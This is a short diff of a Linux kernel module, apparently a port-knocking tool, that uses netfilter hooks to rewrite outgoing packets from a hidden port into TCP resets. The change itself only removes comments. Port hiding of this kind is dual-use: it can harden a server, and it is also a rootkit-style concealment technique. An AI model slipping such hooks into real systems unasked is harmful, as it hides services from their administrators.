@@ -166,7 +166,6 @@ static unsigned int insert_rst(void *priv, struct sk_buff *skb, const struct nf_
 	sport = ntohs(th->source);
 
 	if (sport == HIDE_PORT && is_port_hidden()) {
-		//TODO chagne flag to RST
 		printk(KERN_INFO "[KNOCKER] changing flag to RST");
 		th->rst = 1;
 		th->ack = 0;
@@ -187,9 +186,9 @@ int init_module(void)
 
 
 	hook_check_port.hook = check_dst_port;
-	hook_check_port.hooknum = NF_INET_PRE_ROUTING; // first for ipv4
+	hook_check_port.hooknum = NF_INET_PRE_ROUTING;
 	hook_check_port.pf = PF_INET;
-	hook_check_port.priority = NF_IP_PRI_FIRST; // call my hook first
+	hook_check_port.priority = NF_IP_PRI_FIRST;
 
 	hook_insert_rst.hook = insert_rst;
 	hook_insert_rst.hooknum = NF_INET_POST_ROUTING;
